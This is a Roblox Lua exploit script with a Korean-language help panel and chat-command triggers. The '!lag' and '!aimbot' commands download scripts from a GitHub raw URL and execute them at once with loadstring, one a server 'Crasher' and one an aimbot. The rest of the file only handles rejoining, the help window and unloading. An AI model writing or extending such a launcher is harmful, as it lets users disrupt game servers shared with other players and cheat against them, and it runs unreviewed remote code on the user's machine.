local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local lp = Players.LocalPlayer

local chatConnection

local function createHelpGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "HelpGui"
    screenGui.Parent = lp:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 999999999
    screenGui.IgnoreGuiInset = true

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(1, -350, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.Visible = false
    frame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Text = "명령어 목록"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = frame

    local list = Instance.new("TextLabel")
    list.Size = UDim2.new(1, -20, 1, -50)
    list.Position = UDim2.new(0, 15, 0, 50)
    list.Text = "• !재접 / !rj : 서버 재접속\n• !렉 / !lag : 서버 렉 실행\n• !도움 / !help : 명령어 목록\n• !에임봇 / !aimbot / !DShub : 에임봇 실행\n• !종료 / !end : 스크립트 종료"
    list.TextColor3 = Color3.fromRGB(220, 220, 220)
    list.BackgroundTransparency = 1
    list.Font = Enum.Font.Gotham
    list.TextSize = 16
    list.TextXAlignment = Enum.TextXAlignment.Left
    list.TextYAlignment = Enum.TextYAlignment.Top
    list.Parent = frame

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 5)
    btnCorner.Parent = closeBtn

    closeBtn.MouseButton1Click:Connect(function()
        frame.Visible = false
    end)

    return frame, screenGui
end

local helpFrame, helpGui = createHelpGui()

StarterGui:SetCore("SendNotification", {
    Title = "스크립트 활성화됨",
    Text = "!help 또는 !도움을 입력하세요.",
    Duration = 5
})

chatConnection = lp.Chatted:Connect(function(msg)
    local lowerMsg = msg:lower()

    if lowerMsg == "!재접" or lowerMsg == "!rj" then
        pcall(function()
            if #Players:GetPlayers() <= 1 then
                TeleportService:Teleport(game.PlaceId, lp)
            else
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)
            end
        end)

    elseif lowerMsg == "!렉" or lowerMsg == "!lag" or lowerMsg == "렉?" or lowerMsg == "lag?" then
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))()
        end)

    elseif lowerMsg == "!에임봇" or lowerMsg == "!aimbot" or lowerMsg == "에임봇?" or lowerMsg == "aimbot?" or lowerMsg == "!DShub" then
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/aimbot"))()
        end)

    elseif lowerMsg == "!도움" or lowerMsg == "!help" then
        helpFrame.Visible = not helpFrame.Visible

    elseif lowerMsg == "!종료" or lowerMsg == "!end" then
        StarterGui:SetCore("SendNotification", {
            Title = "스크립트 종료",
            Text = "스크립트가 성공적으로 종료되었습니다.",
            Duration = 5
        })
        warn("스크립트가 종료되었습니다.")
        
        if chatConnection then
            chatConnection:Disconnect()
        end
        if helpGui then
            helpGui:Destroy()
        end
    end
end)

print("스크립트가 로딩 되었습니다 --")
